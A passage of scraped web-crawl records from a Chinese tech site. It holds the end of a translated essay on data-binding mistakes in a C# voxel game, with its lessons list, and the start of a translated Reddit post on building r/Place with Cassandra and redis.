class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector3</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FloorPosition</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">floor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-52\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Height</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Height</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-53\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MaxSpeed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MaxSpeed</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-54\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JumpSpeed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JumpSpeed</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-55\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector3</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SupportVelocity</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SupportVelocity</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-56\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">EnableEnhancedWallRun</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">EnableEnhancedRollSlide</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-57\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">AllowUncrouch</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">AllowUncrouch</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-58\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Crouched</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Crouched</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-59\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">EnableWalking</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">EnableWalking</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-60\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector3</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LinearVelocity</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LinearVelocity</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-61\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector3</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">transform</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Position</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Position</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-62\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Predictor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">predictor</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-63\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Bind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">model</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-64\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">VoxelTools</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">voxelTools</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-65\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CommandBinding</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">DeactivateWallRun</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Action</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Deactivate</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-66\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CommandBinding</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Footstep</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">footsteps</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Footstep</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0283 seconds] -->\r\n<p>我遇到了一大堆的问题。我创建了绑定循环，导致死循环。我发现初始化顺序常常很重要。然而，初始化是数据绑定的噩梦，一些属性在添加绑定时被多次初始化。</p>\n<p>当添加动画的时候，我发现数据绑定使得在两个状态之间动画化，变得困难和不直观。不仅仅是我遇到了这个问题。在解释任何时候运行动画都必须关闭数据绑定之前，先看一下视频 <a href=\"https://youtu.be/g01dGsKbXOk?t=18m11s\">Netflix 的这个演讲</a>——人们侃侃而谈 React 是多么伟大的技术。</p>\n<p>I我也意识到需要打开或关闭数据绑定，所以我添加了一个新的变量：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c1521797757842\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass Binding&lt;T&gt;\r\n{\r\n    public bool Enabled;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c1521797757842-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1521797757842-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1521797757842-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1521797757842-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c1521797757842-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">T</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1521797757842-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1521797757842-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">bool</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Enabled</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1521797757842-4\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>不幸的是，这破坏了数据绑定的目的。我想摆脱 UI 状态，这段代码实际上<strong>添加</strong>了一些。我要怎样消除这个状态？</p>\n<p>我知道！数据绑定！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c1524335327757\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass Binding&lt;T&gt;\r\n{\r\n    public Property&lt;bool&gt; Enabled = new Property&lt;bool&gt; { Value = true };\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c1524335327757-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1524335327757-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1524335327757-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1524335327757-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c1524335327757-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">T</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1524335327757-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1524335327757-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">Property</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Enabled</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">Property</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1524335327757-4\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>是的，我真的试了一下。 它一直是绑定着的。 我很快意识到这是多么的疯狂。</p>\n<p>我们该如何改进数据绑定呢？ 尝试让你的 UI 变成真正的功能性的和状态无关的。<a href=\"https://github.com/ocornut/imgui\">dear imgui</a> 是一个很好的例子。尽可能分离行为和状态。避免那些让创建状态变得容易的技术。创建状态是需要付出代价的。</p>\n<h3>总结</h3>\n<p>还有很多很多更尴尬的错误需要讨论。我发现了另一种「创造性」的方法来避免全局变量；有一段时间，我和闭包纠缠不清；我设计过「实体」、「组件」、「系统」，这种可以是任何东西的对象；我曾试过用多线程的方式运行一个体素引擎，通过在每个使用它的地方进行加锁。</p>\n<p>以下是这些经验的总结：</p>\n<ul>\n<li>提前处理，而不是简单地将问题留给电脑。</li>\n<li>分离行为和状态。</li>\n<li>编写单一功能函数。</li>\n<li>先写客户端代码。</li>\n<li>写无聊的代码。</li>\n</ul>\n<p>以上是我的编程故事。欢迎大家分享自己的编程糗事~</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111373\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111373votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111373\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">听风</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/9538B04AD8C6883F49C38BC8ECDDAF3C/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q4000052677\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q4000052677/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 19</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1fgcguhnh8fj20sg0dnmy2.jpg"], "fav_nums": 2, "comment_nums": 0, "create_date": "2017/06/09", "praise_nums": 3}
{"tags": "Reddit,IT技术", "front_image_path": "full/2da3c21a904312643f8f1b56d8eeb7b84f584ec8.jpg", "title": "揭秘 Reddit 愚人节项目的技术实现过程", "url_object_id": "09b885cc800839c518c644472774a334", "url": "http://blog.jobbole.com/111398/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/snowhere\">孙腾浩</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://redditblog.com/2017/04/13/how-we-built-rplace/\">Reddit</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p><img src=\"https://i2.wp.com/redditupvoted.files.wordpress.com/2017/04/place-final.png?crop=0px%2C0px%2C1000px%2C483px&amp;resize=1200%2C580&amp;ssl=1\" alt=\"\"></p>\n<p>每年的愚人节，我们喜欢创建项目来探索人类大规模的交流互动，而不是做一些恶作剧。今年我们提出了 r/Place，这是一个协作的画板，每个用户每 5 分钟只能修改一个小块。这一限制弱化了个体的重要性，强化了大量用户协作完成复杂创作的必要性。每个小块的变化实时传递给观察者。</p>\n<p>许多开发团队（前端、后端、移动端）协作开发这个项目，项目大部分基于 Reddit 已有的技术。这篇文章从技术角度详细描述我们如何完成 r/Place。</p>\n<p>且慢。如果你想查看我们的代码，<a href=\"http://github.com/reddit/reddit-plugin-place-opensource\">在这里</a>。如果你对构建 r/Place 这一类项目感兴趣，<a href=\"https://about.reddit.com/careers/\">我们欢迎你</a>！</p>\n<h2>需求</h2>\n<p>定义愚人节项目的需求十分重要，因为它一旦发布即面向所有 Reddit 用户，没有增长过程。如果它一开始并不能完美运作，似乎就不能吸引足够的用户来创作并获得有趣的体验。</p>\n<ul>\n<li>画板必须有 1000×1000 个小块，所以它会非常大。</li>\n<li>所有客户端必须和当前画板状态同步，并显示一致，否则用户基于不同版本的画板难以协作。</li>\n<li>我们必须支持至少 100000 的并发同步用户。</li>\n<li>用户每 5 分钟可以修改一个小块，所以我们必须支持平均每 5 分钟 100000 个小块的更新（每秒 333 个更新）。</li>\n<li>项目的设计必须遵循这一点，即使 r/Place 流量巨大，也不能影响站点其他功能。</li>\n<li>配置必须有足够弹性，应对意外的瓶颈或故障。这意味着画板的大小和小块的使用间隔可以在运行时调节，以防数据量过大或更新过于频繁。</li>\n<li>API 必须开放和透明，reddit 社区如果对此有兴趣，可以在此之上构建项目（机器人、扩展、数据收集、外部可视化等等）。</li>\n</ul>\n<h2>后端</h2>\n<h3>实施决策</h3>\n<p>后端最大的挑战就是保持所有客户端与画板状态同步。我们的解决方案是初始化客户端状态时立刻实时监听小块的变化，然后请求整个画板状态。只要我们在生成画板的时候有实时的小块更改，那么响应返回的整个画板状态就会有几秒的延迟。当客户端接收到整个画板状态，把在等待请求时的小块变化在画板上重演。之后接收到所有小块变化实时绘制在画板上。</p>\n<p>为了让这个策略正常实施，我们需要尽可能快的请求到画板的整体状态。我们的初步方案是用<a href=\"https://pandaforme.gitbooks.io/introduction-to-cassandra/content/understand_the_cassandra_data_model.html\">单行 Cassandra</a> 储存整个画板，每个针对整个画板的请求可以读取整行。行中的每列格式如下所示：</p>\n<p><code>(x, y): {‘timestamp’: epochms, ‘author’: user_name, ‘color’: color}</code></p>\n<p>因为画板包含一百万个小块，这意味着我们不得不读取有一百万列的行。在我们的生产集群上这种读取花费 30 秒，慢到无法接受，所以我们不能过度依赖 Cassandra。</p>\n<p>我们下一个方案使用 redis 储存整个画板。我们使用 bitfield 处理一百万个 4 位的整型。每个 4 位的整型可以编码 4 位的颜色，横纵（x，y）坐标可以在 bitfield 里用偏移量表示（offset = x + 1000y）。我们可以通过读取整个 bitfield 来获取整个画板的状态。我们可以通过在 bitfield 中更新指定偏移量上的值，来更新单独的小块(不再需要加锁或读/改/写)。我们仍然需要在 Cassandra 中储存所有的细节，让用户可以检查单独的小块，看一看何时何人更改了它。我们也计划用 Cassandra 备份整个画板，以防 redis 失效。从 redis 中读取整个画板不超过 100ms，这已经足够快了。</p>\n<p>插图展示了我们如何用 redis 储存 2×2 